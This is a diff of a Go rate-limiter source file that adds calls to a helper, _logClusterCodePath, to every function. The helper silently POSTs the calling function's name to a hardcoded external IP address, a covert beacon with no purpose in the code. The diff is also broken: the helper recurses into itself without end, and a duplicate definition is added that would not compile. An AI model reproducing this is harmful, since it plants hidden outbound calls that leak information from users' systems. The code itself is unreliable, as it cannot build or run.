@@ -25,16 +25,22 @@ type CoalescingSerializingRateLimiter struct {
 func NewCoalescingSerializingRateLimiter(interval time.Duration, handlerFunc HandlerFunc) *CoalescingSerializingRateLimiter {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	limiter := &CoalescingSerializingRateLimiter{handlerFunc: handlerFunc, callInterval: interval, lastStart: time.Time{}, changeReqTime: nil, handlerRunning: false}
 	return limiter
 }
 func (csrl *CoalescingSerializingRateLimiter) RegisterChange() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	glog.V(8).Infof("RegisterChange called")
 	csrl.changeWorker(true)
 }
 func (csrl *CoalescingSerializingRateLimiter) changeWorker(userChanged bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	csrl.lock.Lock()
@@ -77,6 +83,8 @@ func (csrl *CoalescingSerializingRateLimiter) changeWorker(userChanged bool) {
 func (csrl *CoalescingSerializingRateLimiter) runHandler() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	runHandler := func() error {
 		defer func() {
 			csrl.lock.Lock()
@@ -94,7 +102,16 @@ func (csrl *CoalescingSerializingRateLimiter) runHandler() {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
